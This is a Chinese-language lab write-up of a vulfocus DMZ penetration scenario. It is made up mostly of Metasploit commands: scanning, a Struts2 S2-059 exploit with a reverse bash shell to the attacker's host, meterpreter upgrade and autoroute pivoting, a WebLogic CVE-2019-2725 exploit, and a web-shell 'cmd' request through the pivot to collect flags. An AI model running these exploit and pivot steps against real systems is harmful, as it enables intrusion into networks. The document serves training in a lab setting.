# 场景化漏洞攻防初体验

以 vulfocus 提供的【跨网段渗透(常见的dmz)】为例

可能是全网第一份关于该场景的公开 WriteUp 。

## 场景安装与配置

- 场景管理 - 从【场景商店】下载 跨网段渗透(常见的dmz) - 发布
- 进入【场景】，启动场景
- 阅读场景说明，找到场景入口地址，准备开始【跨网段渗透】体验

### 捕获指定容器的上下行流量


# 建议放到 tmux 会话

```
container_name="<替换为目标容器名称或ID>"
docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
攻破靶标1
metasploit 基础配置
BASH
```
![](./picturn/环境.png)
# 更新 metasploit
```
sudo apt install -y metasploit-framework
```
# 初始化 metasploit 本地工作数据库
```
sudo msfdb init
```
# 启动 msfconsole
```
msfconsole
```
![](./picturn/metasploit.png)
# 确认已连接 pgsql
```
db_status
```
# 建立工作区
```
workspace -a demo
信息收集之服务识别与版本发现

```
![](./picturn/workspace.png)
# 通过 vulfocus 场景页面看到入口靶标的开放端口
```
db_nmap -p 29551 192.168.56.216 -n -A
```
![](./picturn/工作区.png)
# 漏洞利用过程
```
search exp in metasploit
search struts2 type:exploit
```
![](./picturn/searchstr.png)
# 查看 exp 详情
```
info 2
```
![](./picturn/info.png)
# 完善搜索关键词
```
search S2-059 type:exploit
```
![](./picturn/searchs2.png)
# 使用 exp
```
use 0
show options
```
![](./picturn/use1.png)
# 配置 payload
```
set payload payload/cmd/unix/reverse_bash
set RHOSTS 192.168.56.216
set rport 29551
set LHOST 192.168.56.214
```
![](./picturn/showpayload.png)
![](./picturn/showoptions.png)
![](./picturn/配置.png)
# 执行攻击
```
run -j
```
![](./picturn/run1.png)
# 查看会话列表
```
sessions -l
```

# 进入会话
```
sessions -i 1
id
```
# 获取 flag-1
```
ls /tmp
```
![](./picturn/flag1.png)
# 建立立足点并发现靶标2-4
会话升级
```
search meterpreter type:post
use post/multi/manage/shell_to_meterpreter
set lhost 192.168.56.214
set session 1
run -j
```
![](./picturn/-u1.png)
网络侦查

# 查看路由表
```
route
```
![](./picturn/route.png)
# 添加路由
```
run autoroute -s 192.170.84.0/24
```
![](./picturn/auto1.png)
# 端口扫描
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.170.84.2-254
set rport 7001
run -j
```
![](./picturn/searchport.png)
# 攻破靶标2-4

# 漏洞利用
```
search cve-2019-2725
use 0
set RHOSTS 192.170.84.2
run -j
```
![](./picturn/exploit.png)
# 获取 flag
```
sessions -c "ls /tmp" -i 3,4,5
```
![](./picturn/flag2.png)
![](./picturn/flag3.png)
![](./picturn/flag4.png)
# 发现终点靶标

# 网络接口侦查
```
sessions -c "ifconfig" -i 3,4,5
```
![](./picturn/第二层内网.png)
![](./picturn/wget回应.png)
# 端口扫描新子网

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.169.85.2-254
set ports 80
run
拿到终点靶标上的 Flag
```

# 通过跳板机访问靶标
```
sessions -c "wget 'http://192.169.85.2/index.php?cmd=ls /tmp' -O /tmp/result && cat /tmp/result" -i 5
```
![](./picturn/flag5.png)
停止抓包并分析
进入 vulfocus 所在虚拟机的 GUI 桌面，使用 Wireshark 打开捕获到的数据包
通过 scp 将捕获到的数据包拷贝到宿主机上使用 Wireshark 分析
